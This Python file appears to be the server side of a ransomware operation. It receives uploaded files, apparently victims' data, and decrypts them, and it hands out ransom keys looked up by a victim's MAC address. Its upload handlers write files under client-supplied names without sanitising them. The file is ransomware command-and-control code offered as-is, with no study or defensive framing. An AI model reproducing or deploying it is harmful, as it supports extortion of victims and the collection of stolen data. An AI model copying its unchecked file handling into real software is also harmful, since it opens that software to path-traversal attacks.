# Do not use this server live. Upgrade to handle only get and post request. 
# Creating only an API server will work
import os
import cgi
import http.server as server
import ransomware_decrypt_key as ransom
import decrypt_data

from urllib.parse import urlparse

class HTTPRequestHandler(server.SimpleHTTPRequestHandler):
    """Extend SimpleHTTPRequestHandler to handle PUT requests"""
    def do_PUT(self):
        """Save a file following a HTTP PUT request"""
        filename = os.path.basename(self.path)
        if os.path.exists(filename):
            self.send_response(409, 'Conflict')
            self.end_headers()
            reply_body = '"%s" already exists\n' % filename
            self.wfile.write(reply_body.encode('utf-8'))
            return

        file_length = int(self.headers['Content-Length'])
        read = 0
        with open(filename, 'wb+') as output_file:
            while read < file_length:
                new_read = self.rfile.read(min(66556, file_length - read))
                read += len(new_read)
                output_file.write(new_read)
        self.send_response(201, 'Created')
        self.end_headers()
        reply_body = 'Saved "%s"\n' % filename
        self.wfile.write(reply_body.encode('utf-8'))

    def do_POST(self):
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
                     'CONTENT_TYPE':self.headers['Content-Type'],
                     })

        filename = form['file'].filename
        data = form['file'].file.read()

        if not os.path.isdir("data"):
            os.makedirs("data")

        with open(f"./data/{filename}", "wb") as outfile:
            outfile.write(data)
        decrypt_data.decrypt_file(f"./data/{filename}")
        
        self.send_response(201, 'Created')
        self.end_headers()
        reply_body = 'Saved "%s"\n' % filename
        self.wfile.write(reply_body.encode('utf-8'))
    
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query = parsed_path.query
        path = parsed_path.path
        
        print(type(query), query)
        query = query.split("=")
        if len(query) and query[0] == "mac":
            mac_hex = query[0]
            ransom_key = ransom.get_ransom_key(query[1])

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            self.wfile.write(ransom_key)
        else:
            server.SimpleHTTPRequestHandler.do_GET(self)


if __name__ == '__main__':
    server.test(HandlerClass=HTTPRequestHandler)
